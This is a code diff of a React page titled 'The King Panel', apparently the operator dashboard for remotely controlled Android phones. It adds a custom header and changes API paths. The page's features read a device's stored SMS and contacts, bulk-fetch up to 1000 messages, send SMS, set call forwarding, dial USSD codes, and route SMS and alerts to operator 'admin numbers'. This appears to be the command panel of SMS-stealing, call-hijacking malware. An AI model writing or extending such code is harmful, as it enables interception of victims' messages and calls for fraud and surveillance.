@@ -1,8 +1,7 @@
-// src/pages/DeviceDetailPage.tsx
+// src/pages/DeviceDetailPage.tsx — The King Panel
 import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from "react";
 import axios from "axios";
 import { useLocation, useNavigate, useParams } from "react-router-dom";
-import TopNav, { type TabKey } from "../components/layout/TopNav";
 import wsService from "../services/ws/wsService";
 import { getDevice, pushSendSms, pushCallForward, pushMakeCall, pushReadOldSms, pushReadContacts, getDeviceContacts } from "../services/api/devices";
 import { listDeviceNotifications } from "../services/api/sms";
@@ -135,6 +134,43 @@ function DeviceAlert({ message, startTime, onClose }: { message: string; startTi
         <div className="mb-4 text-[16px] font-extrabold text-red-500">Alert</div>
         <div className="text-center"><div className="mb-2 text-[12px] text-gray-500">{elapsed}</div><div className="whitespace-pre-line text-[14px] leading-6 text-gray-900">{message}</div></div>
       </div>
+    </div>
+  );
+}
+
+// ── King Header (replaces TopNav on this page only) ───────────────────────────
+function KingDeviceHeader({ deviceName, deviceId, alertText, activeTab, onTabChange, onBack }: {
+  deviceName: string; deviceId: string; alertText: string;
+  activeTab: string; onTabChange: (tab: string) => void; onBack: () => void;
+}) {
+  const tabs = ["home", "data", "messages", "groups"];
+  return (
+    <div className="bg-[#111827] sticky top-0 z-50">
+      <div className="flex items-center gap-2 px-3 pt-3 pb-2">
+        <button type="button" onClick={onBack}
+          className="w-[36px] h-[36px] bg-white/10 border border-white/10 rounded-[10px] flex items-center justify-center text-white text-[18px] cursor-pointer flex-shrink-0">
+          ←
+        </button>
+        <div className="flex-1 min-w-0">
+          <div className="text-[15px] font-bold text-white truncate">{deviceName || "Device"}</div>
+          <div className="text-[10px] text-white/30 font-mono truncate">{deviceId}</div>
+        </div>
+      </div>
+      {alertText && (
+        <div className="mx-3 mb-2 bg-white/06 border border-white/08 rounded-[10px] px-3 py-1.5 flex items-center gap-2 overflow-hidden">
+          <div className="w-[6px] h-[6px] rounded-full bg-amber-400 flex-shrink-0" style={{ animation: "adot 1.5s ease-in-out infinite" }} />
+          <span className="text-[11px] text-white/50 whitespace-nowrap inline-block truncate">{alertText}</span>
+        </div>
+      )}
+      <div className="flex px-2">
+        {tabs.map(tab => (
+          <button key={tab} type="button" onClick={() => onTabChange(tab)}
+            className={`flex-1 py-2 text-[10px] font-semibold border-b-2 transition-all cursor-pointer bg-transparent capitalize ${activeTab === tab ? "text-white border-white" : "text-white/30 border-transparent"}`}>
+            {tab}
+          </button>
+        ))}
+      </div>
+      <style>{`@keyframes adot{0%,100%{opacity:1;}50%{opacity:0.3;}}`}</style>
     </div>
   );
 }
@@ -366,14 +402,14 @@ export default function DeviceDetailPage() {
     } else { logStatus(`Calling: ${rawCode}`); try { await pushMakeCall(did, code, ussdSim); } catch {} }
   }
 
-  // ADDED: Save Admin Numbers (Android showEditAdminsDialog)
+  // ADDED: Save Admin Numbers
   async function handleSaveAdmins() {
     setAdminsSaving(true); setAdminsMsg("");
     const filtered = adminNumbers.map(n => n.trim()).filter(n => n.length >= 7);
     try {
-      await axios.put(`${ENV.API_BASE}/api/admin/devices/${encodeURIComponent(did)}/admins`, { admins: filtered, deviceId: did }, { headers: apiHeaders() });
+      await axios.put(`${ENV.API_BASE}/api/devices/${encodeURIComponent(did)}/admins`, { admins: filtered, deviceId: did }, { headers: apiHeaders() });
       wsService.sendCmd("admins:update", { uniqueid: did, admins: filtered });
-      try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/admins`, { admins: filtered }, { headers: apiHeaders() }); } catch {}
+      try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/push-admins`, { admins: filtered }, { headers: apiHeaders() }); } catch {}
       setAdminsMsg("✅ Saved!");
       setDeviceDoc((prev: any) => prev ? { ...prev, admins: filtered } : prev);
       setTimeout(() => { setAdminsMsg(""); setAdminsOpen(false); }, 1500);
@@ -381,13 +417,13 @@ export default function DeviceDetailPage() {
     finally { setAdminsSaving(false); }
   }
 
-  // ADDED: Change Forwarding SIM (Android showChangeSimDialog)
+  // ADDED: Change Forwarding SIM
   async function handleSimChange(value: "auto" | "sim1" | "sim2") {
     setSimChangeSaving(true);
     try {
-      await axios.put(`${ENV.API_BASE}/api/admin/devices/${encodeURIComponent(did)}/forwardingSim`, { value, deviceId: did }, { headers: apiHeaders() });
+      await axios.put(`${ENV.API_BASE}/api/devices/${encodeURIComponent(did)}/forwardingSim`, { value, deviceId: did }, { headers: apiHeaders() });
       wsService.sendCmd("forwardingSim:update", { uniqueid: did, value });
-      try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/forwardingSim`, { value }, { headers: apiHeaders() }); } catch {}
+      try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/push-forwarding-sim`, { value }, { headers: apiHeaders() }); } catch {}
       setDeviceDoc((prev: any) => prev ? { ...prev, forwardingSim: value } : prev);
       setSimChangeOpen(false);
       logStatus(`Forwarding SIM: ${value}`, "green");
@@ -396,13 +432,6 @@ export default function DeviceDetailPage() {
   }
 
   function navBack() { nav("/", { state: { tab: fromTab } }); }
-  function handleTopNavTabChange(tab: TabKey) {
-    if (tab === "home") { navBack(); return; }
-    if (tab === "devices") { nav("/", { state: { tab: "devices" } }); return; }
-    if (tab === "data") setDeviceTab("data");
-    else if (tab === "messages") setDeviceTab("messages");
-    else if (tab === "groups") setDeviceTab("groups");
-  }
 
   const lastSeenTs = checkedAt > 0 ? checkedAt : 0;
   const isRecent = checkedAt > 0 && (Date.now() - checkedAt) < 5 * 60 * 1000;
@@ -421,7 +450,6 @@ export default function DeviceDetailPage() {
   const android = safeStr(device?.metadata?.androidVersion || "");
   const forwardOn = !!(device?.metadata?.forwardCallActive || device?.forwardCallActive);
   const installTs = getTs({ createdAt: device?.createdAt });
-  // ADDED: for table rows
   const adminsOnDevice = (device?.admins || []).filter((a: string) => a?.trim());
   const forwardingSim = safeStr(device?.forwardingSim || device?.metadata?.forwardingSim || "auto").toUpperCase();
 
@@ -451,12 +479,20 @@ export default function DeviceDetailPage() {
     });
   }
 
-  const topNavActiveTab: TabKey = deviceTab === "data" ? "data" : deviceTab === "messages" ? "messages" : deviceTab === "groups" ? "groups" : "home";
   if (!did) return <div className="p-4">Missing device ID</div>;
 
   return (
     <div className="min-h-screen bg-gray-50">
-      <TopNav activeTab={topNavActiveTab} onTabChange={handleTopNavTabChange} showBack={true} onBack={navBack} darkMode={false} onToggleDark={() => {}} alertText={alertText} />
+      {/* ── KING HEADER (replaces TopNav) ── */}
+      <KingDeviceHeader
+        deviceName={brand ? `${brand}${model ? ` (${model})` : ""}` : "Device"}
+        deviceId={did}
+        alertText={alertText}
+        activeTab={deviceTab}
+        onTabChange={(tab) => setDeviceTab(tab as DeviceTab)}
+        onBack={navBack}
+      />
+
       {lockGateOpen && (
         <div className="flex min-h-[80vh] items-center justify-center px-4">
           <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-lg">
@@ -472,6 +508,7 @@ export default function DeviceDetailPage() {
           </div>
         </div>
       )}
+
       {!lockGateOpen && (
         <div className="mx-auto max-w-[480px] px-3 pb-24 pt-3">
           {loading ? <div className="rounded-xl bg-white p-8 text-center text-gray-400 shadow-sm">Loading...</div> : (
@@ -486,9 +523,7 @@ export default function DeviceDetailPage() {
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date</td><td className="py-3 pr-4 text-[13px] font-semibold text-green-600">{installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "-")}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Checked</td><td className="py-3 pr-4"><TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} /></td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Activity</td><td className="py-3 pr-4">{lastActivityAt > 0 ? (<div><TimeAgo ts={lastActivityAt} className="text-[13px] font-semibold text-blue-600" />{lastActivityAction && <span className="ml-2 rounded bg-blue-50 border border-blue-100 px-1.5 py-0.5 text-[11px] font-semibold text-blue-500">{actionLabel[lastActivityAction] || lastActivityAction}</span>}</div>) : <span className="text-[13px] text-gray-400">No activity yet</span>}</td></tr>
-                    {/* ADDED: Admin Numbers row */}
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Admin Numbers</td><td className="py-3 pr-4"><button type="button" onClick={() => { setAdminsOpen(true); setAdminsMsg(""); }} className="text-[13px] font-semibold text-blue-600 hover:underline">{adminsOnDevice.length > 0 ? `${adminsOnDevice.length} saved — Edit` : "None — Add"}</button></td></tr>
-                    {/* ADDED: Forwarding SIM row */}
                     <tr><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forwarding SIM</td><td className="py-3 pr-4"><button type="button" onClick={() => setSimChangeOpen(true)} className="text-[13px] font-semibold text-blue-600 hover:underline">{forwardingSim} — Change</button></td></tr>
                   </tbody>
                 </table>
@@ -517,17 +552,14 @@ export default function DeviceDetailPage() {
           )}
         </div>
       )}
+
       {devAlert && <DeviceAlert message={devAlert.message} startTime={devAlert.startTime} onClose={() => setDevAlert(null)} />}
       {getSmsOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Get SMS</span><button type="button" onClick={() => setSmsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-1 text-[13px] font-semibold text-gray-600">SMS Count: <span className="font-normal text-gray-400">1 — 1000</span></div><input type="number" min="1" max="1000" value={getSmsCount} onChange={e => setSmsCount(String(Math.min(1000, Math.max(1, Number(e.target.value) || 1))))} className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[16px] outline-none focus:border-gray-400" /><button type="button" onClick={handleGetSms} className="mt-5 w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">GET SMS</button></div></div>}
       {sendOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Send SMS</span><button type="button" onClick={() => setSendOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div><div className="mb-4 flex flex-wrap gap-2"><button type="button" onClick={() => setSmsSimSlot(0)} className={["rounded-xl border px-4 py-2 text-[13px] font-semibold", smsSimSlot === 0 ? "border-green-500 bg-green-50 text-green-700" : "border-gray-200 bg-white text-gray-700"].join(" ")}>{smsSim1Label}</button><button type="button" onClick={() => setSmsSimSlot(1)} className={["rounded-xl border px-4 py-2 text-[13px] font-semibold", smsSimSlot === 1 ? "border-green-500 bg-green-50 text-green-700" : "border-gray-200 bg-white text-gray-700"].join(" ")}>{smsSim2Label}</button></div><div className="mb-1 text-[13px] font-semibold text-gray-600">Number:</div><input value={receiver} onChange={e => setReceiver(e.target.value)} inputMode="tel" className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /><div className="mb-1 text-[13px] font-semibold text-gray-600">Message:</div><textarea value={messageBody} onChange={e => setMessageBody(e.target.value)} rows={3} className="mb-5 w-full resize-none rounded-xl border border-gray-200 px-4 py-3 text-[14px] outline-none focus:border-gray-400" /><button type="button" onClick={handleSendSms} disabled={sendingSms || !receiver.trim() || !messageBody.trim()} className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">{sendingSms ? "Sending..." : "Proceed"}</button></div></div>}
       {cfOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Call Forwarding</span><button type="button" onClick={() => setCfOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-2 text-[13px] font-semibold text-gray-600">SIM:</div><div className="mb-4 overflow-hidden rounded-xl border border-gray-200">{simOptions.map((o, idx) => <button key={o.value} type="button" onClick={() => setCfSim(o.value)} className={["flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold", idx < simOptions.length - 1 ? "border-b border-gray-100" : "", cfSim === o.value ? "text-gray-900" : "text-gray-400"].join(" ")}><span>{o.label}</span><div className={["h-5 w-5 rounded-full border-2", cfSim === o.value ? "border-yellow-600 bg-yellow-600" : "border-gray-300"].join(" ")} /></button>)}</div><input value={cfNumber} onChange={e => setCfNumber(e.target.value)} placeholder="Forwarding number" inputMode="tel" className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /><div className="space-y-2"><button type="button" onClick={() => handleCallForward("activate")} className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">Proceed</button><div className="grid grid-cols-2 gap-2"><button type="button" onClick={() => handleCallForward("deactivate")} className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 leading-tight">DeActive Call Forwarding</button><button type="button" onClick={() => handleCallForward("check")} className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">Check Forwarding</button></div></div></div></div>}
       {ussdOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">USSD Dialing</span><button type="button" onClick={() => setUssdOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div><select value={ussdSim} onChange={e => setUssdSim(Number(e.target.value))} className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">{simOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}</select><div className="mb-1 text-[13px] font-semibold text-gray-600">USSD Code:</div><input value={ussdCode} onChange={e => setUssdCode(e.target.value)} placeholder="e.g. *123#" autoFocus className="mb-5 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /><button type="button" onClick={handleDialUssd} disabled={!ussdCode.trim()} className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">Proceed</button></div></div>}
       {bulkSmsOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-3 flex items-center justify-between"><span className="text-[16px] font-extrabold">Bulk SMS Fetch</span><button type="button" onClick={() => setBulkSmsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-3 rounded-xl bg-blue-50 border border-blue-100 px-3 py-2 text-[12px] text-blue-600">Device se last N SMS fetch karo. Bade count mein zyada time lagega.</div><div className="mb-1 text-[13px] font-semibold text-gray-600">Count: <span className="font-normal text-gray-400">1 — 1000</span></div><input type="number" min="1" max="1000" value={bulkSmsCount} onChange={e => setBulkSmsCount(String(Math.min(1000, Math.max(1, Number(e.target.value) || 100))))} className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[16px] outline-none focus:border-gray-400" /><div className="mt-2 mb-4 flex gap-2">{[50,100,200,500].map(n => <button key={n} type="button" onClick={() => setBulkSmsCount(String(n))} className={`flex-1 rounded-lg border py-1.5 text-[12px] font-bold transition ${bulkSmsCount === String(n) ? "border-blue-500 bg-blue-50 text-blue-600" : "border-gray-200 text-gray-500"}`}>{n}</button>)}</div><button type="button" onClick={handleBulkSms} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-extrabold text-white hover:bg-gray-800">Fetch {bulkSmsCount} SMS</button></div></div>}
-
-      {/* ADDED: Admin Numbers Modal - same style as existing modals */}
       {adminsOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Admin Phone Numbers</span><button type="button" onClick={() => setAdminsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-4 text-[12px] text-gray-400">Ek saath 4 numbers save ho sakte hain. SMS aur alerts inhe milenge.</div><div className="space-y-3 mb-4">{adminNumbers.map((num, i) => (<div key={i}><div className="mb-1 text-[12px] font-semibold text-gray-500">Number {i + 1}</div><input type="tel" inputMode="tel" value={num} onChange={e => { const updated = [...adminNumbers]; updated[i] = e.target.value; setAdminNumbers(updated); }} placeholder={`Phone Number ${i + 1}`} className="h-11 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /></div>))}</div>{adminsMsg && <div className={`mb-3 text-center text-[13px] font-semibold ${adminsMsg.startsWith("✅") ? "text-green-600" : "text-red-500"}`}>{adminsMsg}</div>}<button type="button" onClick={handleSaveAdmins} disabled={adminsSaving} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-extrabold text-white hover:bg-gray-800 disabled:opacity-50">{adminsSaving ? "Saving..." : "Save Numbers"}</button></div></div>}
-
-      {/* ADDED: Forwarding SIM Modal - same style as cfOpen modal */}
       {simChangeOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Select Forwarding SIM</span><button type="button" onClick={() => setSimChangeOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-4 overflow-hidden rounded-xl border border-gray-200">{([{value:"auto",label:"Auto",desc:"System decide karega"},{value:"sim1",label:"SIM 1",desc:simSummary.sim1!=="-"?`${simSummary.sim1Carrier!=="-"?simSummary.sim1Carrier+" · ":""}${simSummary.sim1}`:"Primary SIM"},{value:"sim2",label:"SIM 2",desc:simSummary.sim2!=="-"?`${simSummary.sim2Carrier!=="-"?simSummary.sim2Carrier+" · ":""}${simSummary.sim2}`:"Secondary SIM"}] as {value:"auto"|"sim1"|"sim2";label:string;desc:string}[]).map((opt,idx,arr) => { const current = safeStr(device?.forwardingSim||"auto")===opt.value; return (<button key={opt.value} type="button" onClick={() => !simChangeSaving && handleSimChange(opt.value)} disabled={simChangeSaving} className={["flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold disabled:opacity-50",idx<arr.length-1?"border-b border-gray-100":"",current?"text-gray-900":"text-gray-400"].join(" ")}><div className="text-left"><div>{opt.label}</div><div className="text-[11px] font-normal text-gray-400 mt-0.5">{opt.desc}</div></div><div className={["h-5 w-5 rounded-full border-2",current?"border-yellow-600 bg-yellow-600":"border-gray-300"].join(" ")} /></button>); })}</div>{simChangeSaving && <div className="text-center text-[13px] text-gray-400">Saving...</div>}</div></div>}
     </div>
   );
